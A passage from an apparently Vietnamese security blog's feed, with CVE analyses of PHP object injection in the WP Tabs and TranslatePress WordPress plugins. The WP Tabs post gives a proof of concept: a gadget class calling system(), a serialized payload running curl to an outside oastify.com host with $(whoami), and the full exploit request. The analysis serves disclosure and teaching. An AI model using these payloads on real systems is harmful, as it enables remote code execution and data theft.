class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;@param $associative: When true , JSON objects will be returned as associative arrays; when false , JSON objects will be returned as objects. When null , JSON objects will be returned as associative arrays or objects depending on whether JSON_OBJECT_AS_ARRAY is set in the flags.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Sau ƒë√≥ &lt;code&gt;import( $shortcodes )&lt;/code&gt; ƒë∆∞·ª£c g·ªçi v·ªõi &lt;code&gt;$shortcodes&lt;/code&gt; l√† gi√° tr·ªã c·ªßa &lt;code&gt;$data[&#39;shortcode&#39;]&lt;/code&gt;, ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c c·∫•u tr√∫c hi·ªán t·∫°i c·ªßa JSON c·∫ßn upload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;shortcode&amp;#34;: {&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function import( $shortcodes ) {&#xA;    $errors = array();&#xA;    foreach ( $shortcodes as $index =&amp;gt; $shortcode ) {&#xA;        $errors[ $index ] = array();&#xA;        $new_tabs_id      = 0;&#xA;        try {&#xA;            ...&#xA;            if ( isset( $shortcode[&amp;#39;meta&amp;#39;] ) &amp;amp;&amp;amp; is_array( $shortcode[&amp;#39;meta&amp;#39;] ) ) {&#xA;                foreach ( $shortcode[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value ) {&#xA;                    if ( &amp;#39;sp_tab_source_options&amp;#39; === $key || &amp;#39;sp_tab_shortcode_options&amp;#39; === $key ) {&#xA;                        $sanitize_value = $this-&amp;gt;sanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( &amp;#39;{#ID#}&amp;#39;, $new_tabs_id, $value ) ) );&#xA;&#xA;                        update_post_meta(&#xA;                            $new_tabs_id,&#xA;                            $key,&#xA;                            $sanitize_value&#xA;                        );&#xA;&#xA;                    }&#xA;                }&#xA;            }&#xA;        } catch ( Exception $e ) {&#xA;            array_push( $errors[ $index ], $e-&amp;gt;getMessage() );&#xA;            // If there was a failure somewhere, clean up.&#xA;            wp_trash_post( $new_tabs_id );&#xA;        }&#xA;        ...&#xA;    }&#xA;&#xA;    $errors = reset( $errors );&#xA;    return isset( $errors[0] ) ? new WP_Error( &amp;#39;import_tabs_error&amp;#39;, $errors[0] ) : $shortcodes;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m duy·ªát qua c√°c shortcode v√† ki·ªÉm tra &lt;code&gt;shortcode[&#39;meta&#39;]&lt;/code&gt; c√≥ t·ªìn l·∫°i d∆∞·ªõi d·∫°ng m·∫£ng hay kh√¥ng, n·∫øu c√≥ s·∫Ω duy·ªát t·ª´ng ph·∫ßn t·ª´ trong m·∫£ng &lt;code&gt;$shortcode[&#39;meta&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$sanitize_value = $this-&amp;gt;sanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( &amp;#39;{#ID#}&amp;#39;, $new_tabs_id, $value ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu key l√† &lt;code&gt;sp_tab_source_options&lt;/code&gt; ho·∫∑c &lt;code&gt;sp_tab_shortcode_options&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Thay th·∫ø chu·ªói &lt;code&gt;{#ID#}&lt;/code&gt; trong gi√° tr·ªã b·∫±ng &lt;code&gt;$new_tabs_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi h√†m &lt;code&gt;maybe_unserialize()&lt;/code&gt; ƒë·ªÉ gi·∫£i m√£ d·ªØ li·ªáu n·∫øu n√≥ ƒëang ·ªü d·∫°ng serialize.&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi h√†m &lt;code&gt;sanitize_and_collect_metabox_data()&lt;/code&gt; ƒë·ªÉ l·ªçc v√† chu·∫©n h√≥a d·ªØ li·ªáu.&lt;/li&gt;&#xA;&lt;li&gt;Cu·ªëi c√πng, d√πng &lt;code&gt;update_post_meta()&lt;/code&gt; ƒë·ªÉ l∆∞u d·ªØ li·ªáu ƒë√£ x·ª≠ l√Ω v√†o b·∫£ng meta c·ªßa post c√≥ ID &lt;code&gt;$new_tabs_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nh∆∞ v·∫≠y ta c√≥ th·ªÉ th·∫•y n·ªôi dung JSON file c·∫ßn upload l√†:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;shortcode&amp;#34;: {&#xA;    &amp;#34;shortcode1&amp;#34;: {&#xA;      &amp;#34;meta&amp;#34;: {&#xA;        &amp;#34;sp_tab_source_options&amp;#34;: &amp;#34;serialized_payload&amp;#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode&amp;#34;] --&amp;gt; B[&amp;#34;import_shortcode() invoked&amp;#34;]&#xA;&#xA;B --&amp;gt; C{&amp;#34;Check nonce: wp_verify_nonce()&amp;#34;}&#xA;C --&amp;gt;|Fail| X[&amp;#34;Stop &amp;amp; return error: Nonce verification failed&amp;#34;]&#xA;C --&amp;gt;|Pass| D[&amp;#34;json_decode() twice ‚Üí extract $shortcodes&amp;#34;]&#xA;&#xA;D --&amp;gt;|Empty/Invalid| Y[&amp;#34;Stop &amp;amp; return error: Nothing to import&amp;#34;]&#xA;D --&amp;gt;|Valid| E[&amp;#34;Call import($shortcodes)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Loop through each shortcode&amp;#34;]&#xA;F --&amp;gt; H{&amp;#34;Has &amp;#39;meta&amp;#39; and is array?&amp;#34;}&#xA;H --&amp;gt;|No| Z[&amp;#34;Skip entry&amp;#34;]&#xA;H --&amp;gt;|Yes| I[&amp;#34;Loop each meta field&amp;#34;]&#xA;&#xA;I --&amp;gt; J{&amp;#34;Key == &amp;#39;sp_tab_source_options&amp;#39; OR &amp;#39;sp_tab_shortcode_options&amp;#39;?&amp;#34;}&#xA;J --&amp;gt;|No| Z&#xA;J --&amp;gt;|Yes| K[&amp;#34;Replace {#ID#} with new ID&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;maybe_unserialize() ‚Üê Vulnerable&amp;#34;]&#xA;&#xA;L --&amp;gt; M{&amp;#34;Does unserialize create object?&amp;#34;}&#xA;M --&amp;gt;|Yes| R[&amp;#34;Object Injection ‚Üí Possible RCE if malicious class exists&amp;#34;]&#xA;M --&amp;gt;|No| S[&amp;#34;Sanitize &amp;#43; update_post_meta() and continue&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o class ƒë·ªÉ test ƒë·∫∑t trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Import JSON file:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;shortcode&amp;#34;: {&#xA;    &amp;#34;shortcode1&amp;#34;: {&#xA;      &amp;#34;meta&amp;#34;: {&#xA;        &amp;#34;sp_tab_source_options&amp;#34;: &amp;#34;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:75:\&amp;#34;curl http://m7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com/?leadked=$(whoami)\&amp;#34;;}&amp;#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: administrator_cookie&#xA;...&#xA;shortcode=%22%7B%5Cr%5Cn&amp;#43;&amp;#43;%5C%22shortcode%5C%22%3A&amp;#43;%7B%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;%5C%22shortcode1%5C%22%3A&amp;#43;%7B%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;%5C%22meta%5C%22%3A&amp;#43;%7B%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;%5C%22sp_tab_source_options%5C%22%3A&amp;#43;%5C%22O%3A4%3A%5C%5C%5C%22Evil%5C%5C%5C%22%3A1%3A%7Bs%3A7%3A%5C%5C%5C%22command%5C%5C%5C%22%3Bs%3A75%3A%5C%5C%5C%22curl&amp;#43;http%3A%2F%2Fm7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com%2F%3Fleadked%3D%24(whoami)%5C%5C%5C%22%3B%7D%5C%22%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;%7D%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;%7D%5Cr%5Cn&amp;#43;&amp;#43;%7D%5Cr%5Cn%7D%22&amp;amp;action=tabs_import_shortcode&amp;amp;nonce=b6d5e5977d&amp;amp;unSanitize=&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/result.png&#39; alt=&#34;Result&#34; height=&#34;578&#34; width=&#34;1136&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-48134 xu·∫•t ph√°t t·ª´ vi·ªác deserialization d·ªØ li·ªáu kh√¥ng ƒë√°ng tin c·∫≠y th√¥ng qua &lt;code&gt;maybe_unserialize()&lt;/code&gt; trong qu√° tr√¨nh import, cho ph√©p PHP Object Injection v√† c√≥ th·ªÉ d·∫´n ƒë·∫øn RCE n·∫øu t·ªìn t·∫°i class nguy hi·ªÉm. D√π y√™u c·∫ßu t√†i kho·∫£n Administrator v√† nonce h·ª£p l·ªá, h·∫≠u qu·∫£ v·∫´n nghi√™m tr·ªçng khi b·ªã khai th√°c. Phi√™n b·∫£n 2.2.13 ƒë√£ s·ª≠a b·∫±ng c√°ch kh√¥ng cho ph√©p t·∫°o object t√πy √Ω khi unserialize.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguy√™n nh√¢n: deserialization d·ªØ li·ªáu input kh√¥ng ki·ªÉm so√°t.&lt;/li&gt;&#xA;&lt;li&gt;H·∫≠u qu·∫£: Object Injection v√† Remote Code Execution.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn quy·ªÅn Administrator ƒë·ªÉ khai th√°c.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n unserialize d·ªØ li·ªáu ng∆∞·ªùi d√πng n·∫øu kh√¥ng gi·ªõi h·∫°n class ho·∫∑c ki·ªÉm so√°t an to√†n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-expand-tabs-free/vulnerability/wordpress-wp-tabs-2-2-11-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Tabs Plugin &amp;lt;= 2.2.12 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30773 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-23-cve-2025-30773/</link>
      <pubDate>Sun, 23 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-23-cve-2025-30773/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng Deserialization of Untrusted Data trong Cozmoslabs TranslatePress cho ph√©p Object Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn TranslatePress: t·ª´ n/a cho ƒë·∫øn phi√™n b·∫£n 2.9.6.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30773&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30773&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/translatepress-multilingual/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;TranslatePress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.6&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.7&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v2.9.6):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function trp_update_database(){&#xA;    if ( ! current_user_can( apply_filters(&amp;#39;trp_update_database_capability&amp;#39;, &amp;#39;manage_options&amp;#39;) ) ){&#xA;        $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Your user account doesn\&amp;#39;t have the capability to perform database updates.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;    }&#xA;&#xA;    $nonce = isset( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ), &amp;#39;tpupdatedatabase&amp;#39; ) : false;&#xA;    if ( $nonce === false ){&#xA;        $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Invalid nonce.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;    }&#xA;    ...&#xA;    $extra_params = isset( $_REQUEST[&amp;#39;trp_updb_extra_params&amp;#39;] ) ? unserialize(base64_decode(sanitize_text_field($_REQUEST[&amp;#39;trp_updb_extra_params&amp;#39;] ))) : array();&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒëo·∫°n m√£ n√†y, h√†m &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng (&lt;code&gt;$_REQUEST[&#39;trp_updb_extra_params&#39;]&lt;/code&gt; sau khi lo·∫°i b·ªè HTML v√† gi·∫£i m√£ base64). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m 